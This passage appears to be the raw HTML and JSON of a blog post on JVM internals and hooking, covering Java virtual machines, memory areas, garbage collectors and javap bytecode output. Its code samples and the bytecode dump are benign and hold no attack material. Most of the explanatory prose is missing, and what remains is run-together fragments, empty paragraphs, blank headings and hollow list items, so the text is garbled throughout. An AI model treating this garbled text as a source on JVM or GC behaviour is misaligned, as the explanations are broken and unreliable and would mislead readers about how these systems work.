punctuation\">{</span>\n            c <span class=\"token operator\">=</span> <span class=\"token function\">findClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token function\">resolveClass</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>JavaJDKThread Context ClassLoaderJava</p>\n<h2 id=\"Hook\"><a href=\"#Hook\" class=\"headerlink\" title=\"Hook\"></a>Hook</h2><h3 id=\"Hook\"><a href=\"#Hook\" class=\"headerlink\" title=\"Hook\"></a>Hook</h3><p>hook<strong>hook</strong></p>\n<h3 id=\"Hook\"><a href=\"#Hook\" class=\"headerlink\" title=\"Hook\"></a>Hook</h3><p><img src=\"https://pic2.zhimg.com/80/v2-58f3800446ebb35fa8f38de1449a6af5_1440w.jpg\" alt=\"img\"></p>\n<p>/Hook</p>\n<p>:</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">object</span> ServiceHolder <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> apiService<span class=\"token operator\">:</span> IWebServiceRepository <span class=\"token operator\">=</span> <span class=\"token function\">WebServiceRepository</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// WebServiceRepository</span>\n<span class=\"token keyword\">class</span> WebServiceRepository <span class=\"token operator\">:</span> IWebServiceRepository <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> BASE_URL <span class=\"token operator\">=</span> <span class=\"token string\">\"https://api.bifrost.kim\"</span>\n    \n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">getJsonData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Data <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// ...</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<p>apiService</p>\n<p>InvocationHandler</p>\n<p>asm</p>\n<h3 id=\"LSposedHook-\"><a href=\"#LSposedHook-\" class=\"headerlink\" title=\"LSposedHook ()\"></a>LSposedHook ()</h3><blockquote>\n<p> </p>\n</blockquote>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"JVM-amp-Hook\"><a href=\"#JVM-amp-Hook\" class=\"headerlink\" title=\"JVM &amp; Hook\"></a>JVM &amp; Hook</h1><blockquote>\n<p></p>\n</blockquote>\n<h2 id=\"JVM\"><a href=\"#JVM\" class=\"headerlink\" title=\"JVM\"></a>JVM</h2><p><strong>Java Virtual Machine</strong>Java</p>\n<blockquote>\n<p>Virtual Machine</p>\n</blockquote>\n<p>JVM<strong></strong>JavaAPIAPI<strong></strong>(native)nativejava</p>\n<p>JVMJVM<code>java -jar</code>jar, JVMJVM<strong></strong>jarMETA-INFmain</p>\n<p>JavaJVMJavaAPIJVM <em><strong>Write once, run anywhere</strong></em>native(C, C++, Rust, Go)JVM</p>\n<h2 id=\"JVM\"><a href=\"#JVM\" class=\"headerlink\" title=\"JVM\"></a>JVM</h2><p></p>\n<h3 id=\"Sun-Classic-VM\"><a href=\"#Sun-Classic-VM\" class=\"headerlink\" title=\"Sun Classic VM\"></a>Sun Classic VM</h3><blockquote>\n<p></p>\n</blockquote>\n<p>Java</p>\n<h3 id=\"HotSpot-VM\"><a href=\"#HotSpot-VM\" class=\"headerlink\" title=\"HotSpot VM\"></a>HotSpot VM</h3><blockquote>\n<p></p>\n</blockquote>\n<p>Java</p>\n<h3 id=\"Graal-VM\"><a href=\"#Graal-VM\" class=\"headerlink\" title=\"Graal VM\"></a>Graal VM</h3><blockquote>\n<p></p>\n</blockquote>\n<p>JVMJavaNode.jsExpress</p>\n<h3 id=\"Dalvik-VM\"><a href=\"#Dalvik-VM\" class=\"headerlink\" title=\"Dalvik VM\"></a>Dalvik VM</h3><blockquote>\n<p>Android</p>\n</blockquote>\n<blockquote>\n<p>Dalvik<a href=\"https://baike.baidu.com/item/Google/86964\">Google</a>Android<a href=\"https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E6%9C%BA/104440\"></a>DalvikGoogleAndroid .dexDalvik ExecutableJava.dexDalvik<a href=\"https://baike.baidu.com/item/%E5%8E%8B%E7%BC%A9%E6%A0%BC%E5%BC%8F/2844535\"></a>Dalvik Dalvik Linux </p>\n<p>DalvikIOS</p>\n<p>2014625Android L I&#x2F;OAndroid L <a href=\"https://baike.baidu.com/item/%E8%B0%B7%E6%AD%8C/117920\"></a>DalvikART</p>\n</blockquote>\n<h3 id=\"ART\"><a href=\"#ART\" class=\"headerlink\" title=\"ART\"></a>ART</h3><blockquote>\n<p>ART(Android Runtime)Android 4.4DalvikAndroid 4.4DVMARTAndroid 5.0ARTDVM</p>\n</blockquote>\n<p><strong>DalvikdexART</strong></p>\n<blockquote>\n<p>DalvikdexJITdexdexJITDalvikART DalvikARTdexapkdex4.4ART</p>\n</blockquote>\n<p>ART:</p>\n<ul>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<p>ART:</p>\n<ul>\n<li>10%-20%</li>\n<li></li>\n</ul>\n<blockquote>\n<p>ARTGC</p>\n</blockquote>\n<p>&#x2F;&#x2F; TODO </p>\n<h2 id=\"JDK8\"><a href=\"#JDK8\" class=\"headerlink\" title=\"JDK8\"></a>JDK8</h2><p>jvmjvm</p>\n<p>&#x2F;&#x2F; TODO</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>CC++&#x2F;C++MMKVC++(JavaUnsafe&#x2F;C++)</p>\n<p>JVMJVM&#x2F;JVMJVM</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>JavaJava:</p>\n<p><img src=\"http://images2015.cnblogs.com/blog/1182497/201706/1182497-20170616192739978-1176032049.png\" alt=\"Java\"></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p><strong></strong>(), <strong></strong></p>\n<p>Java<strong></strong>)<strong></strong></p>\n<p><strong>Java &amp; </strong></p>\n<p></p>\n<blockquote>\n<p>JavaCPU</p>\n</blockquote>\n<blockquote>\n<p><strong></strong>CPUCPUCPU</p>\n</blockquote>\n<p><strong></strong>: </p>\n<p><code>Thread.sleep(long)</code>cpuJava</p>\n<p>cpu</p>\n<p>cpu<code>Thread#yield()</code>,<strong></strong></p>\n<p>cpu</p>\n<blockquote>\n<p>Thread#sleep</p>\n<p>\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t CPU</p>\n</blockquote>\n<p><code>Thread.sleep()</code></p>\n<p>java:)<strong></strong><strong></strong><strong></strong></p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-161709.jpg\"></p>\n<p><strong></strong></p>\n<p>JVMOOM</p>\n<blockquote>\n<p>Java</p>\n<p>(undefined)</p>\n</blockquote>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>JvmC&#x2F;C++C++nativeJvmJVMvirtual machineC++JavaJVM</p>\n<p>, <strong></strong></p>\n<p></p>\n<blockquote>\n<p></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">></span><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">return</span> <span class=\"token function\">b</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">b</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">return</span> <span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">return</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n<span class=\"token operator\">></span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>a() -&gt; b() -&gt; c() -&gt; </code></p>\n<p><code>main</code></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gywucw6rcyj30ws0gyq4h.jpg\" alt=\"image-20220131142625842\"></p>\n<p><code>a()</code><code>a()</code><code>main</code></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gywuhfjok5j30v40g875z.jpg\" alt=\"image-20220131143641690\"></p>\n<p>abcc</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gywun3qnp6j30zq0h6jtq.jpg\" alt=\"image-20220131144209743\"></p>\n<p>ca+bcc43432211</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNgy1gywxbv24qlj30tk0giwg2.jpg\" alt=\"image-20220131144955668\"></p>\n</blockquote>\n<p><strong></strong>(StackOverFlowException)<code>-Xss size</code>vm options</p>\n<p>:</p>\n<p></p>\n<ul>\n<li><strong></strong></li>\n</ul>\n<p>?</p>\n<ul>\n<li><strong></strong></li>\n</ul>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<h4 id=\"Java\"><a href=\"#Java\" class=\"headerlink\" title=\"Java\"></a>Java</h4><p>Java, GCJava</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>Java<strong></strong>Java(Non-Heap)Java</p>\n<p>HotSpot VM</p>\n<blockquote>\n<p>JIT</p>\n<p>jvm</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-b6f9389c136957504a5c1ae563aba5f3_1440w.jpg\" alt=\"img\"></p>\n</blockquote>\n<p><strong></strong></p>\n<p>JVMclass</p>\n<p><strong></strong>Javac++<code>String#intern()</code></p>\n<blockquote>\n<p>String#intern</p>\n<p>String#intern</p>\n<p>java</p>\n<p>StringStringnew</p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>jvmnew</p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><ul>\n<li></li>\n</ul>\n<p>\tJava</p>\n<ul>\n<li></li>\n</ul>\n<p>\tJava</p>\n<p><strong></strong>: </p>\n<ul>\n<li>CAS</li>\n<li></li>\n</ul>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>null</p>\n<h5 id=\"-Object-Header\"><a href=\"#-Object-Header\" class=\"headerlink\" title=\" (Object Header)\"></a> (Object Header)</h5><p>Javahash code(<code>Object#hashCode()</code>)GC<strong></strong></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p><code>Unsafe#allocateInstance()</code>(GsonKtKtGson)</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>HotSpot: (Header)(Instance Data)(Padding)</p>\n<p>: HashCodeGCID32643264bitMark World</p>\n<p></p>\n<p>HotSpot88812</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>java<strong>reference</strong>()Javareference<strong></strong><strong></strong></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><blockquote>\n<p> Javareference</p>\n</blockquote>\n<p>referenceGCreference</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221205.png\" alt=\"20220708-221205\"></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><blockquote>\n<p>Javareference</p>\n</blockquote>\n<p>java<strong>HotSpot</strong></p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221128.png\" alt=\"20220708-221128\"></p>\n<h3 id=\"-GC\"><a href=\"#-GC\" class=\"headerlink\" title=\" (GC)\"></a> (GC)</h3><p></p>\n<h4 id=\"-amp-\"><a href=\"#-amp-\" class=\"headerlink\" title=\" &amp; \"></a> &amp; </h4><p>Java</p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>+1-10</p>\n<p>Java</p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>JavaC#<strong></strong><strong>GC Roots</strong><strong></strong>GC Roots<strong></strong></p>\n<p>GC Roots:</p>\n<ul>\n<li></li>\n<li> Java</li>\n<li> </li>\n<li>JNI</li>\n<li>Java<strong>Class</strong>NullPointerException</li>\n</ul>\n<p><img src=\"https://img-blog.csdn.net/20180626084654607?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1YnVqaWFuX2w=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>GCGCJDK1.2Java<strong></strong></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>GC</p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>GC<code>SoftReference</code></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>GC<code>WeakReference</code></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p><code>PhantomReference</code></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p></p>\n<p></p>\n<p>Java<strong></strong><strong></strong><strong></strong>HotSpotJDK8JDK8<strong></strong><strong></strong></p>\n<p>HotSpotEdenSurvivor811GC</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbaa6eg9j217a0ggta0.jpg\" alt=\"image-20220222151708141\"></p>\n<p></p>\n<p>Eden</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyo48r0j21i20cqq4l.jpg\" alt=\"image-20220222153104582\"></p>\n<p>EdenSurvivorFromToGCEdenFromFromToFromToToFrom</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyn34yfj21gk0d4gn5.jpg\" alt=\"image-20220222154032674\"></p>\n<p>FromEdenFromToGC<code>+1</code><code>15</code>From</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmc6v1nzcj21h60d2q4l.jpg\" alt=\"image-20220222154828416\"></p>\n<p>ToFrom</p>\n<p></p>\n<ul>\n<li><p>Minor GC   -   </p>\n<ul>\n<li>Eden</li>\n</ul>\n</li>\n<li><p>Major GC   -   </p>\n</li>\n<li><p>Full GC      -    Java</p>\n<ul>\n<li>1</li>\n<li>2Minor GC</li>\n<li>3JDK8</li>\n<li>4<code>System.gc()</code></li>\n</ul>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzml30209wj21u80ren3q.jpg\" alt=\"image-20220222205605690\"></p>\n</li>\n</ul>\n<h5 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\"-\"></a>-</h5><p><code>-</code></p>\n<p>GC Roots</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzme6btluwj21e40c0760.jpg\" alt=\"image-20220222165709034\"></p>\n<p> </p>\n<h5 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\"-\"></a>-</h5><p>-</p>\n<p></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzmlh5aveqj21ti0u079c.jpg\" alt=\"image-20220222210942507\"></p>\n<p>Survivor8:1:1</p>\n<h5 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\"-\"></a>-</h5><p>-GCGC50%</p>\n<p></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzmm4g8voxj21vm08ywhj.jpg\" alt=\"image-20220222213208681\"></p>\n<p>Stop The World</p>\n<p></p>\n<h4 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\" ()\"></a> ()</h4><h5 id=\"Serial\"><a href=\"#Serial\" class=\"headerlink\" title=\"Serial\"></a>Serial</h5><p>JDK1.3.1</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzn92k8ooej21ae0bc75m.jpg\" alt=\"image-20220223104605648\"></p>\n<p>GC15</p>\n<p></p>\n<ol>\n<li></li>\n<li></li>\n</ol>\n<h5 id=\"ParNew\"><a href=\"#ParNew\" class=\"headerlink\" title=\"ParNew\"></a>ParNew</h5><p>Serial</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzn9vbvb0mj21c20c00uc.jpg\" alt=\"image-20220223111344962\"></p>\n<p>SerialJVMParNew</p>\n<h5 id=\"CMS\"><a href=\"#CMS\" class=\"headerlink\" title=\"CMS\"></a>CMS</h5><p>JDK1.5HotSpotCMSConcurrent-Mark-SweepHotSpotGCGC</p>\n<p></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznamys2bdj21as0co404.jpg\" alt=\"image-20220223114019381\"></p>\n<p>4</p>\n<ul>\n<li>GC Roots</li>\n<li>GC Roots</li>\n<li></li>\n<li></li>\n</ul>\n<p>Full GC</p>\n<p>GCG1CMS</p>\n<h5 id=\"Garbage-First-JDK9\"><a href=\"#Garbage-First-JDK9\" class=\"headerlink\" title=\"Garbage First (JDK9+)\"></a>Garbage First (JDK9+)</h5><p>JDK7JDK9JDK8 Parallel Scavenge + Parallel Old </p>\n<p><code>Minor GC</code><code>Major GC </code><code>Full GC</code>G1Java<code>2048</code><code>Region</code><code>Region</code>1MB32MB2N<code>Region</code>JVM</p>\n<p><code>Region</code><code>Region</code>EdenSurvivorG1HumongousRegion</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznc9jvdzdj21f40eiq4g.jpg\" alt=\"image-20220223123636582\"></p>\n<p>CMS</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznc8vqqqij21h00emwgt.jpg\" alt=\"image-20220223123557871\"></p>\n<p></p>\n<ul>\n<li>GC RootsTAMSRegionMinor GCG1</li>\n<li>GC Root</li>\n<li></li>\n<li>RegionRegionRegionRegionRegionRegion</li>\n</ul>\n<h5 id=\"Shenandoah-amp-ZGC-\"><a href=\"#Shenandoah-amp-ZGC-\" class=\"headerlink\" title=\"Shenandoah &amp; ZGC ()\"></a>Shenandoah &amp; ZGC ()</h5><p>G1G1GC</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>:D</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>JavaJVMJarJarclassclassclassKotlinJavaktJavaKotlinJVM</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>Class888ClassC: <strong></strong>, <strong></strong></p>\n<p></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TestClazz</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token function\">sum</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">sum</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> b<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execute sum function.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>javap -verbose</code> </p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Classfile &#x2F;D:&#x2F;project&#x2F;android&#x2F;ksp-learn&#x2F;test&#x2F;build&#x2F;classes&#x2F;java&#x2F;main&#x2F;kim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz.class\n  Last modified 2022-7-9; size 754 bytes\n  MD5 checksum 2b38afaa297c7960c988943b0c475282\n  Compiled from &quot;TestClazz.java&quot;\npublic class kim.bifrost.rain.ksp.TestClazz\n  minor version: 0\n  major version: 52\n  flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:\n   #1 &#x3D; Methodref          #8.#27         &#x2F;&#x2F; java&#x2F;lang&#x2F;Object.&quot;&lt;init&gt;&quot;:()V\n   #2 &#x3D; Fieldref           #28.#29        &#x2F;&#x2F; java&#x2F;lang&#x2F;System.out:Ljava&#x2F;io&#x2F;PrintStream;\n   #3 &#x3D; Methodref          #7.#30         &#x2F;&#x2F; kim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz.sum:(II)I\n   #4 &#x3D; Methodref          #31.#32        &#x2F;&#x2F; java&#x2F;io&#x2F;PrintStream.println:(I)V\n   #5 &#x3D; String             #33            &#x2F;&#x2F; execute sum function.\n   #6 &#x3D; Methodref          #31.#34        &#x2F;&#x2F; java&#x2F;io&#x2F;PrintStream.println:(Ljava&#x2F;lang&#x2F;String;)V\n   #7 &#x3D; Class              #35            &#x2F;&#x2F; kim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz\n   #8 &#x3D; Class              #36            &#x2F;&#x2F; java&#x2F;lang&#x2F;Object\n   #9 &#x3D; Utf8               &lt;init&gt;\n  #10 &#x3D; Utf8               ()V\n  #11 &#x3D; Utf8               Code\n  #12 &#x3D; Utf8               LineNumberTable\n  #13 &#x3D; Utf8               LocalVariableTable\n  #14 &#x3D; Utf8               this\n  #15 &#x3D; Utf8               Lkim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz;\n  #16 &#x3D; Utf8               main\n  #17 &#x3D; Utf8               ([Ljava&#x2F;lang&#x2F;String;)V\n  #18 &#x3D; Utf8               args\n  #19 &#x3D; Utf8               [Ljava&#x2F;lang&#x2F;String;\n  #20 &#x3D; Utf8               a\n  #21 &#x3D; Utf8               I\n  #22 &#x3D; Utf8               b\n  #23 &#x3D; Utf8               sum\n  #24 &#x3D; Utf8               (II)I\n  #25 &#x3D; Utf8               SourceFile\n  #26 &#x3D; Utf8               TestClazz.java\n  #27 &#x3D; NameAndType        #9:#10         &#x2F;&#x2F; &quot;&lt;init&gt;&quot;:()V\n  #28 &#x3D; Class              #37            &#x2F;&#x2F; java&#x2F;lang&#x2F;System\n  #29 &#x3D; NameAndType        #38:#39        &#x2F;&#x2F; out:Ljava&#x2F;io&#x2F;PrintStream;\n  #30 &#x3D; NameAndType        #23:#24        &#x2F;&#x2F; sum:(II)I\n  #31 &#x3D; Class              #40            &#x2F;&#x2F; java&#x2F;io&#x2F;PrintStream\n  #32 &#x3D; NameAndType        #41:#42        &#x2F;&#x2F; println:(I)V\n  #33 &#x3D; Utf8               execute sum function.\n  #34 &#x3D; NameAndType        #41:#43        &#x2F;&#x2F; println:(Ljava&#x2F;lang&#x2F;String;)V\n  #35 &#x3D; Utf8               kim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz\n  #36 &#x3D; Utf8               java&#x2F;lang&#x2F;Object\n  #37 &#x3D; Utf8               java&#x2F;lang&#x2F;System\n  #38 &#x3D; Utf8               out\n  #39 &#x3D; Utf8               Ljava&#x2F;io&#x2F;PrintStream;\n  #40 &#x3D; Utf8               java&#x2F;io&#x2F;PrintStream\n  #41 &#x3D; Utf8               println\n  #42 &#x3D; Utf8               (I)V\n  #43 &#x3D; Utf8               (Ljava&#x2F;lang&#x2F;String;)V\n&#123;\n  public kim.bifrost.rain.ksp.TestClazz();\n    descriptor: ()V\n    flags: ACC_PUBLIC\n    Code:\n      stack&#x3D;1, locals&#x3D;1, args_size&#x3D;1\n         0: aload_0\n         1: invokespecial #1                  &#x2F;&#x2F; Method java&#x2F;lang&#x2F;Object.&quot;&lt;init&gt;&quot;:()V\n         4: return\n      LineNumberTable:\n        line 10: 0\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0       5     0  this   Lkim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz;\n\n  public static void main(java.lang.String[]);\n    descriptor: ([Ljava&#x2F;lang&#x2F;String;)V\n    flags: ACC_PUBLIC, ACC_STATIC\n    Code:\n      stack&#x3D;3, locals&#x3D;3, args_size&#x3D;1\n         0: iconst_1\n         1: istore_1\n         2: iconst_2\n         3: iload_1\n         4: iadd\n         5: istore_2\n         6: getstatic     #2                  &#x2F;&#x2F; Field java&#x2F;lang&#x2F;System.out:Ljava&#x2F;io&#x2F;PrintStream;\n         9: iload_1\n        10: iload_2\n        11: 